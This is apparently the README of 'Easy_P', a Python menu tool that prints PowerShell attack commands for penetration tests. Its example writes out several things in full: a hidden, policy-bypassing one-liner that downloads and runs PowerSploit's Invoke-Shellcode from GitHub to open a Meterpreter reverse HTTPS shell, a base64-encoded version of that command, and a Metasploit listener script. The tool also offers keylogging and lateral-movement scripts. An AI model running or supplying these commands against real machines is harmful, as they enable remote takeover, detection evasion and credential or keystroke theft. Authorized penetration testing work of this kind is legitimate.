< About >

	Easy_P is a tool used for showing a user which PowerShell scripts to use in a penetration test, depending on the users needs. There are 7 different sections of this tool-
	
		[1] Privilege Escalation
		[2] Lateral Movement
		[3] Keylogging
		[4] PowerShell Meterpreter (Reverse HTTPS)
		[5] Change Users Execution Policy
		[6] Powershell 101
		[7] Base64 Encode a PowerShell Script

	Each option reflects what kinds of scripts are available, and what they are used for. These scripts have proven their value during pentests, which is why I've written this
	tool to show the user exactly how a PowerShell script should be executed in their specific situation, such as using a base64 encoded version of the script or executing a
	script to download a PowerShell script from the Internet and execute it.

	For example, let's say a user is in a pentest, and they have a remote Windows shell on a target machine, but they want to utilize PowerShell within their normal shell to
	gain a Metasploit Meterpreter. They can run Easy_P, select [4] for the "PowerShell Meterpreter (Reverse HTTPS)" option, supply their listening IP address and listening port for their reverse
        Meterpreter payload, and they're presented with the following-

		[*]Download from internet and execute:
           	  Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.github.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1'); 
                  Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost localhost -Lport 1337 -Force

		[*]Run from a local copy of the script:
		  powershell.exe -exec bypass -Command "& {Import-Module .\Invoke-Shellcode.ps1; 
                  Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost localhost -Lport 1337 -Force}"

		[*]Base64 encoded version download and execute:
		  powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc 
                  SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhA
                  GQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBtAGEAdAB0AGkAZg
                  BlAHMAdABhAHQAaQBvAG4ALwBQAG8AdwBlAHIAUwBwAGwAbwBpAHQALwBtAGEAcwB0AGUAcgAvAEMAbwBkAGUARQB4AGUAYwB1AHQ
                  AaQBvAG4ALwBJAG4AdgBvAGsAZQAtAFMAaABlAGwAbABjAG8AZABlAC4AcABzADEAJwApADsAIABJAG4AdgBvAGsAZQAtAFMAaABl
                  AGwAbABjAG8AZABlACAALQBQAGEAeQBsAG8AYQBkACAAdwBpAG4AZABvAHcAcwAvAG0AZQB0AGUAcgBwAHIAZQB0AGUAcgAvAHIAZ
                  QB2AGUAcgBzAGUAXwBoAHQAdABwAHMAIAAtAEwAaABvAHMAdAAgAGwAbwBjAGEAbABoAG8AcwB0ACAALQBMAHAAbwByAHQAIAAxADMAMwA3ACAALQBGAG8AcgBjAGUA

		[*]Listner Resource Script (listener.rc) - Save the following to a file called listener.rc on your machine and load your handler with msfconsole -r listener.rc
                                                           Then, execute your desired PowerShell script.
		  use multi/handler 
		  set payload windows/meterpreter/reverse_https 
		  set LHOST <user-defined-listener-ip>
		  set LPORT <user-defined-listener-port>
		  set ExitOnSession false 
		  exploit -j

	
	In this case, the user can use the first option, and execute a PowerShell command to download the script for his Meterpreter from the Internet after setting up his 
        multi/handler (from executing his Listener Resource Script). The script downloaded from the Internet will execute and connect back to his Listener. With the use
	of Easy_P, the user saved time by not having to remember of look up the proper syntax of the command to execute against the target machine he's gained access to, as
	well as being presented with several options for the use of his script that they can apply to their specific situation.

< Usage >

	Simply run-
	  
	  python easy_p.py

	You will then be presented with the menu for Easy_P.
